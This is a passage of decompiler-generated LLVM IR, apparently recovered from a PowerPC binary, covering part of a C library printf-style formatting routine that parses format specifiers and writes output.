  %v0_10009de0 = load i32, i32* @r31, align 4
  store i32 268475880, i32* @lr, align 4
  %v2_10009de4 = call i32 @_ppfs_prepargs(i32 %v2_10009d90, i32 %v0_10009de0)
  store i32 0, i32* %r23.global-to-local, align 4
  %v4_10009e7c = zext i8 %tmp59 to i32
  %v2_10009e80 = icmp sgt i32 %tmp60, 0
  %v2_10009e84 = ptrtoint i32* %stack_var_-112 to i32
  %v2_10009ea8 = ptrtoint i32* %stack_var_-344 to i32
  %v3_10009eac = icmp eq i32 %tmp58, 0
  %tmp73 = icmp sgt i32 %tmp58, -1
  %v3_10009ee0 = icmp eq i32 %tmp57, 0
  %v2_1000a23c = ptrtoint i32* %stack_var_-328 to i32
  %v2_1000a15c = ptrtoint i32* %stack_var_-340 to i32
  %v2_1000a160 = ptrtoint i32* %stack_var_-336 to i32
  %v5_10009fd4 = bitcast i32* %stack_var_-201 to i8*
  %tmp74 = icmp ult i32 %tmp57, 6
  %v3_1000a0b0 = icmp eq i32 %tmp57, 1
  %v2_1000a054 = icmp ugt i32 %tmp57, 2
  %v4_10009f94 = zext i8 %tmp55 to i32
  %v0_1000a3c8.pre = load i32, i32* @r29, align 4
  %v1_10009e94 = mul nuw nsw i32 %v4_10009e7c, 8
  %v2_10009e98 = add i32 %v2_10009e84, %v1_10009e94
  %v1_10009e9c = add i32 %v2_10009e98, -8
  %v1_10009eb0 = add i32 %tmp58, 1
  %v2_10009f08 = icmp ugt i32 %tmp57, 7
  %v2_1000a0e8 = icmp ugt i32 %tmp57, 15
  %v2_1000a11c = icmp ugt i32 %tmp57, 17
  %v3_1000a11c = icmp eq i32 %tmp57, 17
  %v2_1000a1c4 = icmp ugt i32 %tmp57, 19
  %v3_1000a1c4 = icmp eq i32 %tmp57, 19
  %v3_1000a230 = icmp eq i32 %tmp57, 20
  %v1_10009f20 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1001601c.290 to i32), i32 -1)
  %v2_10009f20 = inttoptr i32 %v1_10009f20 to i8*
  %v3_1000a060 = icmp eq i32 %tmp57, 3
  %v3_1000a070 = icmp eq i32 %tmp57, 4
  br label %dec_label_pc_1000a3c8

dec_label_pc_10009df4.backedge:                   ; preds = %dec_label_pc_10009e48, %dec_label_pc_10009e00
  %storemerge13.in = phi i32 [ %v1_10009e10, %dec_label_pc_10009e00 ], [ %v1_10009e48, %dec_label_pc_10009e48 ]
  %v1_10009e0816 = phi i32 [ %v0_10009e20, %dec_label_pc_10009e00 ], [ %v1_10009e48, %dec_label_pc_10009e48 ]
  %storemerge13 = add i32 %storemerge13.in, 1
  store i32 %storemerge13, i32* @r29, align 4
  br label %dec_label_pc_10009df4

dec_label_pc_10009df4:                            ; preds = %dec_label_pc_10009df4.backedge, %dec_label_pc_1000a3c8
  %v0_10009e20 = phi i32 [ %v1_10009e0816, %dec_label_pc_10009df4.backedge ], [ %v0_1000a3c8, %dec_label_pc_1000a3c8 ]
  %v1_10009e10 = phi i32 [ %storemerge13, %dec_label_pc_10009df4.backedge ], [ %v0_1000a3c8, %dec_label_pc_1000a3c8 ]
  %v1_10009df4 = inttoptr i32 %v1_10009e10 to i8*
  %v2_10009df4 = load i8, i8* %v1_10009df4, align 1
  %v3_10009df4 = zext i8 %v2_10009df4 to i32
  store i32 %v3_10009df4, i32* %r0.global-to-local, align 4
  %v3_10009df8 = icmp eq i8 %v2_10009df4, 0
  br i1 %v3_10009df8, label %dec_label_pc_10009e08, label %dec_label_pc_10009e00

dec_label_pc_10009e00:                            ; preds = %dec_label_pc_10009df4
  %v3_10009e00 = icmp eq i8 %v2_10009df4, 37
  br i1 %v3_10009e00, label %dec_label_pc_10009e08, label %dec_label_pc_10009df4.backedge

dec_label_pc_10009e08:                            ; preds = %dec_label_pc_10009e00, %dec_label_pc_10009df4
  %v4_10009e08 = icmp eq i32 %v1_10009e10, %v0_10009e20
  br i1 %v4_10009e08, label %dec_label_pc_10009e3c, label %dec_label_pc_10009e10

dec_label_pc_10009e10:                            ; preds = %dec_label_pc_10009e08
  %v2_10009e10 = sub i32 %v1_10009e10, %v0_10009e20
  store i32 %v2_10009e10, i32* @r31, align 4
  %v4_10009e10 = icmp sgt i32 %v2_10009e10, 0
  br i1 %v4_10009e10, label %dec_label_pc_10009e20, label %dec_label_pc_10009e30

dec_label_pc_10009e20:                            ; preds = %dec_label_pc_10009e10
  %v0_10009e28 = load i32, i32* %r24.global-to-local, align 4
  store i32 268475952, i32* @lr, align 4
  %v3_10009e2c = inttoptr i32 %v0_10009e28 to i16*
  %v4_10009e2c = call i32 @__stdio_fwrite(i32 %v0_10009e20, i32 %v2_10009e10, i16* %v3_10009e2c)
  %v1_10009e30.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009e30

dec_label_pc_10009e30:                            ; preds = %dec_label_pc_10009e10, %dec_label_pc_10009e20
  %v1_10009e38 = phi i32 [ %v1_10009e30.pre, %dec_label_pc_10009e20 ], [ %v2_10009e10, %dec_label_pc_10009e10 ]
  %storemerge2 = phi i32 [ %v4_10009e2c, %dec_label_pc_10009e20 ], [ 0, %dec_label_pc_10009e10 ]
  %v4_10009e30 = icmp eq i32 %storemerge2, %v1_10009e38
  br i1 %v4_10009e30, label %dec_label_pc_10009e38, label %dec_label_pc_1000a3d8

dec_label_pc_10009e38:                            ; preds = %dec_label_pc_10009e30
  %v0_10009e38 = load i32, i32* %r23.global-to-local, align 4
  %v2_10009e38 = add i32 %v0_10009e38, %v1_10009e38
  store i32 %v2_10009e38, i32* %r23.global-to-local, align 4
  %v0_10009e3c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10009e3c

dec_label_pc_10009e3c:                            ; preds = %dec_label_pc_10009e08, %dec_label_pc_10009e38
  %v0_10009e48 = phi i32 [ %v0_10009e20, %dec_label_pc_10009e08 ], [ %v0_10009e3c.pre, %dec_label_pc_10009e38 ]
  %v1_10009e3c = inttoptr i32 %v0_10009e48 to i8*
  %v2_10009e3c = load i8, i8* %v1_10009e3c, align 1
  %v3_10009e3c = zext i8 %v2_10009e3c to i32
  store i32 %v3_10009e3c, i32* %r0.global-to-local, align 4
  %v3_10009e40 = icmp eq i8 %v2_10009e3c, 0
  br i1 %v3_10009e40, label %dec_label_pc_1000a3dc, label %dec_label_pc_10009e48

dec_label_pc_10009e48:                            ; preds = %dec_label_pc_10009e3c
  %v1_10009e48 = add i32 %v0_10009e48, 1
  %v2_10009e48 = inttoptr i32 %v1_10009e48 to i8*
  %v3_10009e48 = load i8, i8* %v2_10009e48, align 1
  %v4_10009e48 = zext i8 %v3_10009e48 to i32
  store i32 %v4_10009e48, i32* %r0.global-to-local, align 4
  %v3_10009e50 = icmp eq i8 %v3_10009e48, 37
  br i1 %v3_10009e50, label %dec_label_pc_10009df4.backedge, label %dec_label_pc_10009e58

dec_label_pc_10009e58:                            ; preds = %dec_label_pc_10009e48
  store i32 %v2_10009d90, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_10009e48, i8** %stack_var_-200, align 4
  store i32 268476016, i32* @lr, align 4
  %v3_10009e6c = call i32 @_ppfs_parsespec(i32* %v1_10009da8, i32 %v1_10009e48)
  store i32 %v2_10009d90, i32* @r3, align 4
  store i32 268476024, i32* @lr, align 4
  %v0_10009e74 = call i32 @_ppfs_setargs()
  store i32 %v4_10009e7c, i32* @r7, align 4
  store i32 %v2_10009e84, i32* %r0.global-to-local, align 4
  br i1 %v2_10009e80, label %dec_label_pc_10009e94, label %dec_label_pc_10009ea0

dec_label_pc_10009e94:                            ; preds = %dec_label_pc_10009e58
  br label %dec_label_pc_10009ea0

dec_label_pc_10009ea0:                            ; preds = %dec_label_pc_10009e58, %dec_label_pc_10009e94
  %v0_10009ecc82 = phi i32 [ %v1_10009e9c, %dec_label_pc_10009e94 ], [ %v2_10009e84, %dec_label_pc_10009e58 ]
  store i32 %v0_10009ecc82, i32* @r10, align 4
  store i32 %v2_10009ea8, i32* @r8, align 4
  store i32 %v1_10009eb0, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_10009ed0.preheader, label %dec_label_pc_10009ed0.preheader.thread

dec_label_pc_10009ed0.preheader.thread:           ; preds = %dec_label_pc_10009ea0
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009edc

dec_label_pc_10009ed0.preheader:                  ; preds = %dec_label_pc_10009ea0
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_10009eac, label %dec_label_pc_10009edc, label %dec_label_pc_10009ec8.preheader

dec_label_pc_10009ec8.preheader:                  ; preds = %dec_label_pc_10009ed0.preheader
  store i32 %v0_10009ecc82, i32* %stack_var_-344, align 4
  %v1_10009ecc83 = add i32 %v0_10009ecc82, 8
  store i32 %v1_10009ecc83, i32* @r10, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_10009ed888 = add i32 %tmp58, -1
  store i32 %v1_10009ed888, i32* %ctr.global-to-local, align 4
  %v2_10009ed889 = icmp eq i32 %v1_10009ed888, 0
  br i1 %v2_10009ed889, label %dec_label_pc_10009edc, label %dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge

dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge: ; preds = %dec_label_pc_10009ec8.preheader, %dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge.dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge_crit_edge
  %v1_10009ec8.pre = phi i32 [ %v1_10009ec8.pre.pre, %dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge.dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge_crit_edge ], [ %v2_10009ea8, %dec_label_pc_10009ec8.preheader ]
  %v1_10009ed091 = phi i32 [ %v1_10009ed0, %dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge.dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge_crit_edge ], [ 4, %dec_label_pc_10009ec8.preheader ]
  %v1_10009ecc90 = phi i32 [ %v1_10009ecc, %dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge.dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge_crit_edge ], [ %v1_10009ecc83, %dec_label_pc_10009ec8.preheader ]
  %v3_10009ec8 = add i32 %v1_10009ec8.pre, %v1_10009ed091
  %v4_10009ec8 = inttoptr i32 %v3_10009ec8 to i32*
  store i32 %v1_10009ecc90, i32* %v4_10009ec8, align 4
  %v0_10009ecc = load i32, i32* @r10, align 4
  %v1_10009ecc = add i32 %v0_10009ecc, 8
  store i32 %v1_10009ecc, i32* @r10, align 4
  %v0_10009ed0 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009ed0 = mul i32 %v0_10009ed0, 4
  store i32 %v1_10009ed0, i32* %r0.global-to-local, align 4
  %v1_10009ed4 = add i32 %v0_10009ed0, 1
  store i32 %v1_10009ed4, i32* %r11.global-to-local, align 4
  %v0_10009ed8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009ed8 = add i32 %v0_10009ed8, -1
  store i32 %v1_10009ed8, i32* %ctr.global-to-local, align 4
  %v2_10009ed8 = icmp eq i32 %v1_10009ed8, 0
  br i1 %v2_10009ed8, label %dec_label_pc_10009edc, label %dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge.dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge_crit_edge

dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge.dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge_crit_edge: ; preds = %dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge
  %v1_10009ec8.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge

dec_label_pc_10009edc:                            ; preds = %dec_label_pc_10009ec8.preheader, %dec_label_pc_10009ec8.dec_label_pc_10009ec8_crit_edge, %dec_label_pc_10009ed0.preheader.thread, %dec_label_pc_10009ed0.preheader
  store i32 %tmp57, i32* %r11.global-to-local, align 4
  br i1 %v3_10009ee0, label %dec_label_pc_10009ee8, label %dec_label_pc_10009f08

dec_label_pc_10009ee8:                            ; preds = %dec_label_pc_10009edc
  %v0_10009eec = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_10009eec, i32* @r6, align 4
  %tmp96 = icmp slt i32 %v0_10009eec, 0
  %v1_10009ef4 = zext i1 %tmp96 to i32
  %v2_10009ef4 = ashr i32 %v0_10009eec, 31
  %v3_10009ef4 = and i32 %v2_10009ef4, -2
  %v4_10009ef4 = or i32 %v3_10009ef4, %v1_10009ef4
  store i32 %v4_10009ef4, i32* @r5, align 4
  %v1_10009efc = call i32 @__asm_rlwinm(i32 %v0_1000a01c, i32 0, i32 20, i32 23)
  store i32 %v1_10009efc, i32* @r4, align 4
  %v1_10009f00 = inttoptr i32 %v1_10009efc to i16*
  %v2_10009f00 = call i32 @_store_inttype(i16* %v1_10009f00)
  br label %dec_label_pc_1000a3c4

dec_label_pc_10009f08:                            ; preds = %dec_label_pc_10009edc
  br i1 %v2_10009f08, label %dec_label_pc_1000a0e8, label %dec_label_pc_10009f10

dec_label_pc_10009f10:                            ; preds = %dec_label_pc_10009f08
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_10009f20 = load i8, i8* %v2_10009f20, align 1
  %v4_10009f20 = zext i8 %v3_10009f20 to i32
  store i32 %v4_10009f20, i32* %r30.global-to-local, align 4
  %v3_10009f24 = icmp eq i8 %v3_10009f20, 10
  br i1 %v3_10009f24, label %dec_label_pc_10009f2c, label %dec_label_pc_10009f54

dec_label_pc_10009f2c:                            ; preds = %dec_label_pc_10009f10
  store i32 %v0_1000a01c, i32* %r0.global-to-local, align 4
  %v1_10009f30 = call i32 @__asm_rlwinm(i32 %v0_1000a01c, i32 26, i32 31, i32 31)
  %v1_10009f34 = call i32 @__asm_rlwinm(i32 %v0_1000a01c, i32 27, i32 31, i32 31)
  %v3_10009f38 = icmp eq i32 %v1_10009f30, 0
  %v2_10009f3c = icmp ne i32 %v1_10009f34, 0
  %not.v2_10009f3c = xor i1 %v2_10009f3c, true
  %v6_10009f40 = sext i1 %not.v2_10009f3c to i32
  store i32 %v6_10009f40, i32* %r0.global-to-local, align 4
  %v1_10009f48 = select i1 %v2_10009f3c, i32 44, i32 87
  store i32 %v1_10009f48, i32* %r31.global-to-local, align 4
  br i1 %v3_10009f38, label %dec_label_pc_10009f54, label %dec_label_pc_10009f50

dec_label_pc_10009f50:                            ; preds = %dec_label_pc_10009f2c
  %v1_10009f50 = or i32 %v1_10009f48, 128
  store i32 %v1_10009f50, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009f54

dec_label_pc_10009f54:                            ; preds = %dec_label_pc_10009f10, %dec_label_pc_10009f2c, %dec_label_pc_10009f50
  %v0_10009f54 = load i32, i32* %r11.global-to-local, align 4
  %v2_10009f54 = icmp ugt i32 %v0_10009f54, 5
  br i1 %v2_10009f54, label %dec_label_pc_10009f7c, label %dec_label_pc_10009f5c

dec_label_pc_10009f5c:                            ; preds = %dec_label_pc_10009f54
  %v3_10009f5c = icmp eq i32 %v0_10009f54, 3
  br i1 %v3_10009f5c, label %dec_label_pc_10009f64, label %dec_label_pc_10009f6c

dec_label_pc_10009f64:                            ; preds = %dec_label_pc_10009f5c
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009f80

dec_label_pc_10009f6c:                            ; preds = %dec_label_pc_10009f5c
  %v3_10009f6c = icmp eq i32 %v0_10009f54, 1
  br i1 %v3_10009f6c, label %dec_label_pc_10009f84, label %dec_label_pc_10009f80

dec_label_pc_10009f7c:                            ; preds = %dec_label_pc_10009f54
  %v0_10009f7c = load i32, i32* %r30.global-to-local, align 4
  %v1_10009f7c = sub i32 0, %v0_10009f7c
  store i32 %v1_10009f7c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009f80

dec_label_pc_10009f80:                            ; preds = %dec_label_pc_10009f6c, %dec_label_pc_10009f64, %dec_label_pc_10009f7c
  br label %dec_label_pc_10009f84

dec_label_pc_10009f84:                            ; preds = %dec_label_pc_10009f6c, %dec_label_pc_10009f80
  %storemerge3 = phi i32 [ 11, %dec_label_pc_10009f80 ], [ 6, %dec_label_pc_10009f6c ]
  store i32 %storemerge3, i32* @r27, align 4
  %v3_10009f84 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10009f84, i32* %r0.global-to-local, align 4
  %tmp75 = icmp sgt i32 %v3_10009f84, -1
  br i1 %tmp75, label %dec_label_pc_10009f98, label %dec_label_pc_10009f94

dec_label_pc_10009f94:                            ; preds = %dec_label_pc_10009f84
  br label %dec_label_pc_10009f98

dec_label_pc_10009f98:                            ; preds = %dec_label_pc_10009f84, %dec_label_pc_10009f94
  %storemerge = phi i32 [ %v4_10009f94, %dec_label_pc_10009f94 ], [ 32, %dec_label_pc_10009f84 ]
  store i32 %storemerge, i32* @r26, align 4
  %v3_10009f98 = icmp eq i32 %v0_10009f54, 1
  br i1 %v3_10009f98, label %dec_label_pc_10009fb4, label %dec_label_pc_10009fa4

dec_label_pc_10009fa4:                            ; preds = %dec_label_pc_10009f98
  %v0_10009fa4 = load i32, i32* @r7, align 4
  %v1_10009fa4 = mul i32 %v0_10009fa4, 4
  store i32 %v1_10009fa4, i32* %r0.global-to-local, align 4
  %v0_10009fa8 = load i32, i32* @r1, align 4
  %v2_10009fa8 = add i32 %v0_10009fa8, %v1_10009fa4
  %v1_10009fac = add i32 %v2_10009fa8, 188
  %v2_10009fac = inttoptr i32 %v1_10009fac to i32*
  %v3_10009fac = load i32, i32* %v2_10009fac, align 4
  store i32 %v3_10009fac, i32* %r0.global-to-local, align 4
  %v1_10009fb0 = call i32 @__asm_rlwinm(i32 %v3_10009fac, i32 0, i32 20, i32 23)
  br label %dec_label_pc_10009fb4

dec_label_pc_10009fb4:                            ; preds = %dec_label_pc_10009f98, %dec_label_pc_10009fa4
  %v3_10009fb4 = load i32, i32* %stack_var_-344, align 4
  %v0_10009fb8 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_10009fb8, i32* @r5, align 4
  %v2_10009fbc = inttoptr i32 %v0_10009fb8 to i32*
  %v3_10009fbc = call i32 @_load_inttype(i32 %v3_10009fb4, i32* %v2_10009fbc)
  %v0_10009fcc = load i32, i32* %r31.global-to-local, align 4
  %v6_10009fd4 = call i32 @_uintmaxtostr(i8* %v5_10009fd4, i32 %v3_10009fbc, i32 %v3_10009fb4, i32 %v0_10009fb8, i32 %v0_10009fcc)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_10009fd4, i32* %r30.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1000a028, label %dec_label_pc_10009fe8

dec_label_pc_10009fe8:                            ; preds = %dec_label_pc_10009fb4
  %v7_10009fd4 = inttoptr i32 %v6_10009fd4 to i8*
  %v3_10009fe8 = load i8, i8* %v7_10009fd4, align 1
  %v4_10009fe8 = zext i8 %v3_10009fe8 to i32
  store i32 %v4_10009fe8, i32* %r0.global-to-local, align 4
  %v3_10009ff0 = icmp eq i8 %v3_10009fe8, 45
  br i1 %v3_10009ff0, label %dec_label_pc_10009ff8, label %dec_label_pc_1000a00c

dec_label_pc_10009ff8:                            ; preds = %dec_label_pc_10009fe8
  %v1_10009ff8 = or i32 %v0_1000a01c, 2
  store i32 %v1_10009ff8, i32* %r0.global-to-local, align 4
  %v2_10009ffc = add i32 %v6_10009fd4, 1
  store i32 %v2_10009ffc, i32* %r30.global-to-local, align 4
  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1000a028

dec_label_pc_1000a00c:                            ; preds = %dec_label_pc_10009fe8
  %v1_1000a00c = and i32 %v0_1000a01c, 2
  store i32 %v1_1000a00c, i32* %r0.global-to-local, align 4
  %v3_1000a00c = icmp eq i32 %v1_1000a00c, 0
  br i1 %v3_1000a00c, label %dec_label_pc_1000a01c, label %dec_label_pc_1000a014

dec_label_pc_1000a014:                            ; preds = %dec_label_pc_1000a00c
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1000a028

dec_label_pc_1000a01c:                            ; preds = %dec_label_pc_1000a00c
  %v1_1000a01c = urem i32 %v0_1000a01c, 2
  store i32 %v1_1000a01c, i32* %r11.global-to-local, align 4
  %v3_1000a01c = icmp eq i32 %v1_1000a01c, 0
  br i1 %v3_1000a01c, label %dec_label_pc_1000a028, label %dec_label_pc_1000a024

dec_label_pc_1000a024:                            ; preds = %dec_label_pc_1000a01c
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1000a028

dec_label_pc_1000a028:                            ; preds = %dec_label_pc_1000a01c, %dec_label_pc_10009fb4, %dec_label_pc_1000a014, %dec_label_pc_10009ff8, %dec_label_pc_1000a024
  %v0_1000a094 = phi i32 [ %v6_10009fd4, %dec_label_pc_10009fb4 ], [ %v2_10009ffc, %dec_label_pc_10009ff8 ], [ %v6_10009fd4, %dec_label_pc_1000a01c ], [ %v6_10009fd4, %dec_label_pc_1000a024 ], [ %v6_10009fd4, %dec_label_pc_1000a014 ]
  %stack_var_-184.0 = phi i32 [ %v0_1000a01c, %dec_label_pc_10009fb4 ], [ %v1_10009ff8, %dec_label_pc_10009ff8 ], [ %v0_1000a01c, %dec_label_pc_1000a01c ], [ %v0_1000a01c, %dec_label_pc_1000a024 ], [ %v0_1000a01c, %dec_label_pc_1000a014 ]
  %v3_1000a028 = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1000a23c, i32* %r0.global-to-local, align 4
  %v2_1000a030 = sub i32 %v2_1000a23c, %v0_1000a094
  %v1_1000a038 = add i32 %v2_1000a030, 127
  store i32 %v1_1000a038, i32* %r31.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1000a028, -1
  br i1 %tmp76, label %dec_label_pc_1000a044, label %dec_label_pc_1000a040

dec_label_pc_1000a040:                            ; preds = %dec_label_pc_1000a028
  br label %dec_label_pc_1000a044

dec_label_pc_1000a044:                            ; preds = %dec_label_pc_1000a028, %dec_label_pc_1000a040
  %v0_1000a078 = phi i32 [ %v3_1000a028, %dec_label_pc_1000a028 ], [ 1, %dec_label_pc_1000a040 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1000a048 = and i32 %stack_var_-184.0, 16
  store i32 %v1_1000a048, i32* %r11.global-to-local, align 4
  %v3_1000a048 = icmp eq i32 %v1_1000a048, 0
  br i1 %v3_1000a048, label %dec_label_pc_1000a094, label %dec_label_pc_1000a050

dec_label_pc_1000a050:                            ; preds = %dec_label_pc_1000a044
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1000a054, label %dec_label_pc_1000a060, label %dec_label_pc_1000a070.thread

dec_label_pc_1000a070.thread:                     ; preds = %dec_label_pc_1000a050
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1000a094

dec_label_pc_1000a060:                            ; preds = %dec_label_pc_1000a050
  br i1 %v3_1000a060, label %dec_label_pc_1000a068, label %dec_label_pc_1000a070

dec_label_pc_1000a068:                            ; preds = %dec_label_pc_1000a060
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1000a094

dec_label_pc_1000a070:                            ; preds = %dec_label_pc_1000a060
  br i1 %v3_1000a070, label %dec_label_pc_1000a078, label %dec_label_pc_1000a094

dec_label_pc_1000a078:                            ; preds = %dec_label_pc_1000a070
  %v3_1000a078 = icmp ugt i32 %v0_1000a078, %v1_1000a038
  br i1 %v3_1000a078, label %dec_label_pc_1000a094, label %dec_label_pc_1000a080

dec_label_pc_1000a080:                            ; preds = %dec_label_pc_1000a078
  %v1_1000a080 = inttoptr i32 %v0_1000a094 to i8*
  %v2_1000a080 = load i8, i8* %v1_1000a080, align 1
  %v3_1000a080 = zext i8 %v2_1000a080 to i32
  store i32 %v3_1000a080, i32* %r0.global-to-local, align 4
  %v3_1000a088 = icmp eq i8 %v2_1000a080, 48
  br i1 %v3_1000a088, label %dec_label_pc_1000a094, label %dec_label_pc_1000a090

dec_label_pc_1000a090:                            ; preds = %dec_label_pc_1000a080
  %v1_1000a090 = add i32 %v2_1000a030, 128
  br label %dec_label_pc_1000a094

dec_label_pc_1000a094:                            ; preds = %dec_label_pc_1000a070.thread, %dec_label_pc_1000a070, %dec_label_pc_1000a080, %dec_label_pc_1000a078, %dec_label_pc_1000a044, %dec_label_pc_1000a068, %dec_label_pc_1000a090
  %v1_1000a0dc = phi i32 [ %v0_1000a078, %dec_label_pc_1000a070 ], [ 1, %dec_label_pc_1000a080 ], [ %v0_1000a078, %dec_label_pc_1000a078 ], [ %v0_1000a078, %dec_label_pc_1000a044 ], [ %v0_1000a078, %dec_label_pc_1000a068 ], [ %v1_1000a090, %dec_label_pc_1000a090 ], [ %v0_1000a078, %dec_label_pc_1000a070.thread ]
  %v1_1000a094 = inttoptr i32 %v0_1000a094 to i8*
  %v2_1000a094 = load i8, i8* %v1_1000a094, align 1
  %v3_1000a094 = zext i8 %v2_1000a094 to i32
  store i32 %v3_1000a094, i32* %r0.global-to-local, align 4
  %v3_1000a098 = icmp eq i8 %v2_1000a094, 48
  br i1 %v3_1000a098, label %dec_label_pc_1000a0a0, label %dec_label_pc_1000a0d8

dec_label_pc_1000a0a0:                            ; preds = %dec_label_pc_1000a094
  %v0_1000a0a0 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_1000a0a0, 6
  br i1 %tmp77, label %dec_label_pc_1000a0ac, label %dec_label_pc_1000a0a8

dec_label_pc_1000a0a8:                            ; preds = %dec_label_pc_1000a0a0
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1000a0ac

dec_label_pc_1000a0ac:                            ; preds = %dec_label_pc_1000a0a0, %dec_label_pc_1000a0a8
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1000a0b0, label %dec_label_pc_1000a0b8, label %dec_label_pc_1000a0c8

dec_label_pc_1000a0b8:                            ; preds = %dec_label_pc_1000a0ac
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_10016000.291 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000a254

dec_label_pc_1000a0c8:                            ; preds = %dec_label_pc_1000a0ac
  %v3_1000a0c8 = icmp eq i32 %v1_1000a0dc, 0
  br i1 %v3_1000a0c8, label %dec_label_pc_1000a0d0, label %dec_label_pc_1000a0d8

dec_label_pc_1000a0d0:                            ; preds = %dec_label_pc_1000a0c8
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000a254

dec_label_pc_1000a0d8:                            ; preds = %dec_label_pc_1000a0c8, %dec_label_pc_1000a094
  %v3_1000a0d8 = icmp ugt i32 %v1_1000a0dc, %v1_1000a038
  %v2_1000a0dc = sub i32 %v1_1000a0dc, %v1_1000a038
  store i32 %v2_1000a0dc, i32* %r29.global-to-local, align 4
  br i1 %v3_1000a0d8, label %dec_label_pc_1000a274thread-pre-split, label %dec_label_pc_1000a254

dec_label_pc_1000a0e8:                            ; preds = %dec_label_pc_10009f08
  br i1 %v2_1000a0e8, label %dec_label_pc_1000a11c, label %dec_label_pc_1000a0f0

dec_label_pc_1000a0f0:                            ; preds = %dec_label_pc_1000a0e8
  %v3_1000a0f0 = load i32, i32* %stack_var_-344, align 4
  %v0_1000a0fc = load i32, i32* %r24.global-to-local, align 4
  store i32 268476684, i32* @lr, align 4
  %v5_1000a108 = call i32 @_fpmaxtostr(i32 %v0_1000a0fc, i32* nonnull %stack_var_-196, i32 268475620, i32 %v3_1000a0f0)
  %v1_1000a10c = icmp slt i32 %v5_1000a108, 0
  br i1 %v1_1000a10c, label %dec_label_pc_1000a3d8, label %dec_label_pc_1000a114

dec_label_pc_1000a114:                            ; preds = %dec_label_pc_1000a0f0
  %v0_1000a114 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000a114 = add i32 %v0_1000a114, %v5_1000a108
  store i32 %v2_1000a114, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000a3c4

dec_label_pc_1000a11c:                            ; preds = %dec_label_pc_1000a0e8
  br i1 %v2_1000a11c, label %dec_label_pc_1000a1c4, label %dec_label_pc_1000a124

dec_label_pc_1000a124:                            ; preds = %dec_label_pc_1000a11c
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1000a130 = load i32, i32* %stack_var_-344, align 4
  %v1_1000a138 = inttoptr i32 %v3_1000a130 to i32*
  %v2_1000a138 = load i32, i32* %v1_1000a138, align 4
  br i1 %v3_1000a11c, label %dec_label_pc_1000a138, label %dec_label_pc_1000a18c

dec_label_pc_1000a138:                            ; preds = %dec_label_pc_1000a124
  store i32 %v2_1000a138, i32* %r0.global-to-local, align 4
  %v3_1000a13c = icmp eq i32 %v2_1000a138, 0
  store i32 %v2_1000a138, i32* %stack_var_-340, align 4
  br i1 %v3_1000a13c, label %dec_label_pc_1000a25c, label %dec_label_pc_1000a148

dec_label_pc_1000a148:                            ; preds = %dec_label_pc_1000a138
  %v3_1000a148 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000a148, i32* %r0.global-to-local, align 4
  %v1_1000a150 = icmp slt i32 %v3_1000a148, 0
  br i1 %v1_1000a150, label %dec_label_pc_1000a15c, label %dec_label_pc_1000a158

dec_label_pc_1000a158:                            ; preds = %dec_label_pc_1000a148
  br label %dec_label_pc_1000a15c

dec_label_pc_1000a15c:                            ; preds = %dec_label_pc_1000a148, %dec_label_pc_1000a158
